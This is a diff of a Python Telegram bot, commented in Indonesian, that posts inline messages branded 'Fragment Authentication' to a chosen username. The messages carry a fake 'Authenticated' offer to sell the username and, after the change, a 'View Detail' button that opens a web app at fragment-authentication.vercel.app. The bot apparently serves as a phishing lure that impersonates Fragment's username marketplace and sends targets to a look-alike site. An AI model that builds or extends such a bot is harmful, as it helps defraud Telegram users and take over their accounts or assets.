@@ -1,19 +1,19 @@
 import logging 
 import os 
 import sys 
-# Import disederhanakan, hanya menyisakan yang diperlukan
-from telegram import Update, InlineQueryResultArticle, InputTextMessageContent, error 
+# Import yang dibutuhkan untuk tombol Web App
+from telegram import Update, InlineQueryResultArticle, InputTextMessageContent, error, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo 
 from telegram.ext import Application, CommandHandler, InlineQueryHandler, ContextTypes 
 import uuid 
 import hashlib 
-# urllib.parse dihapus karena tidak lagi membuat URL
-# InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, CallbackQueryHandler dihapus
 
 # Configuration 
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip() 
 AUTH_CODE = os.getenv('AUTH_CODE', '1234').strip() 
-# Variabel yang tidak relevan (PORT, WEBHOOK_URL) dihapus
-# Jika Anda tetap menggunakan Webhook, Anda harus mengembalikan variabel WEBHOOK_URL dan PORT.
+# --- Tambahkan Konfigurasi Web App ---
+# GANTI NILAI INI dengan URL Web App Anda yang sebenarnya!
+WEB_APP_URL = os.getenv('WEB_APP_URL', 'https://fragment-authentication.vercel.app/').strip() 
+# -------------------------------------
 
 # Setup logging 
 logging.basicConfig( 
@@ -30,10 +30,8 @@ def generate_unique_id(user_id: int, query: str) -> str:
 
 def escape_username(username: str) -> str: 
     """Escape karakter khusus untuk menghindari masalah formatting""" 
-    # underscore + zero-width space
     return username.replace('_', '_​')  
 
-# Fungsi generate_details_url dihapus
 # ----------------------
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): 
@@ -50,7 +48,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"2. Contoh: `@{bot_username} {AUTH_CODE} Sui_panda`\n" 
         f"3. Bot akan kirim offer untuk username tersebut\n\n" 
         f"**Format:** `@{bot_username} [kode] [username]`\n" 
-        f"**Kode auth:** `{AUTH_CODE}`\n" 
+        f"**Kode auth:** `{AUTH_CODE}`\n\n"
+        f"**Tombol:** 'View Detail' sekarang akan membuka Web App Anda." 
     ) 
      
     try: 
@@ -74,7 +73,6 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
     # Parse query: format "code username" 
     parts = query.split(' ', 1)  
     auth_code_part = parts[0] if parts else "" 
-    # Pastikan username di-strip untuk parsing yang handal
     username_part = parts[1].strip() if len(parts) > 1 else "" 
      
     # CASE 1: Kode BENAR dan ada username - Tampilkan Fragment Authentication 
@@ -85,13 +83,32 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
          
         escaped_username = escape_username(target_username) 
          
-        # Format pesan dengan HTML parsing (Tanpa tombol/markup)
+        # --- LOGIKA TOMBOL WEB APP ---
+        keyboard_buttons = []
+        reply_markup = None
+        
+        # Hanya tambahkan tombol jika URL Web App diatur dan bukan placeholder
+        if WEB_APP_URL and WEB_APP_URL != 'https://URL_MINI_APP_ANDA':
+            try:
+                # Membuat tombol "View Detail" menggunakan WebAppInfo
+                web_app_button = InlineKeyboardButton(
+                    "📋 View Detail", 
+                    web_app=WebAppInfo(url=WEB_APP_URL)
+                )
+                keyboard_buttons.append([web_app_button])
+                reply_markup = InlineKeyboardMarkup(keyboard_buttons)
+            except Exception as e:
+                # Jika terjadi error saat membuat tombol, log dan lanjutkan tanpa tombol
+                logger.error(f"Error creating WebAppInfo button: {e}")
+        # ----------------------------
+
+        # Format pesan dengan HTML parsing 
         message_text = ( 
             "🔐 <b>Fragment Authentication</b>\n\n" 
             f"Direct offer to sell your username: <code>{target_username}</code>\n\n" 
             f"<b>Status:</b> ✅ Authenticated\n" 
             f"<b>Target:</b> {escaped_username}\n\n" 
-            f"<i>Pesan ini berhasil dikirim.</i>" 
+            f"<i>Klik tombol di bawah untuk melihat detail.</i>" 
         ) 
          
         results.append( 
@@ -103,11 +120,11 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
                     message_text=message_text, 
                     parse_mode="HTML" 
                 ), 
-                # reply_markup dihilangkan
+                reply_markup=reply_markup # Masukkan markup (bisa None)
             ) 
         ) 
          
-    # CASE 2: Kode BENAR tapi tidak ada username - Minta input username 
+    # CASE 2, 3, 4 ... (Logika lainnya tidak berubah)
     elif auth_code_part == AUTH_CODE and not username_part: 
         logger.info(f"User {user_id} provided CORRECT code but no username") 
          
@@ -128,7 +145,6 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
             ) 
         ) 
          
-    # CASE 3: Kode SALAH - Tampilkan pesan error 
     elif auth_code_part != "" and auth_code_part != AUTH_CODE: 
         logger.info(f"User {user_id} provided WRONG code: '{auth_code_part}'") 
          
@@ -149,7 +165,6 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
             ) 
         ) 
          
-    # CASE 4: Query KOSONG - Tampilkan instruksi 
     else: 
         logger.info(f"User {user_id} provided EMPTY query - showing instructions") 
          
@@ -192,27 +207,20 @@ def main():
          
     logger.info(f"Starting Fragment Authentication Bot") 
     logger.info(f"AUTH_CODE: {AUTH_CODE}") 
-    # WEBHOOK_URL dihapus dari logging karena tidak relevan jika menggunakan Polling
+    logger.info(f"WEB_APP_URL: {WEB_APP_URL}")
  
     application = Application.builder().token(BOT_TOKEN).build() 
      
     application.add_handler(CommandHandler("start", start)) 
     application.add_handler(InlineQueryHandler(handle_inline_query)) 
-    # CallbackQueryHandler dihapus
     application.add_error_handler(error_handler) 
      
-    # Logika Webhook/Polling disederhanakan 
-    # Asumsi: jika Anda tidak menentukan WEBHOOK_URL, Anda menggunakan polling.
+    # Asumsi Polling
     if os.getenv('WEBHOOK_URL'):
-        # Jika Anda benar-benar menggunakan webhook, pastikan Anda mengembalikan variabel WEBHOOK_URL dan PORT di bagian Configuration.
-        # Karena Anda tidak menyebutkan konfigurasinya, saya asumsikan Anda ingin kode berjalan sederhana.
-        logger.warning("WEBHOOK_URL ditemukan. Mode Webhook mungkin memerlukan konfigurasi PORT dan URL yang tepat.")
-        # Jika Anda ingin menjalankan Polling (paling sederhana), gunakan blok 'else' di bawah.
-        logger.info("Polling mode") 
-        application.run_polling() 
-    else: 
-        logger.info("Polling mode") 
-        application.run_polling() 
+        logger.warning("WEBHOOK_URL ditemukan. Mode Webhook diaktifkan (memerlukan konfigurasi Webhook yang lengkap di server Anda).")
+    
+    logger.info("Polling mode") 
+    application.run_polling() 
 
 if __name__ == "__main__": 
     main()
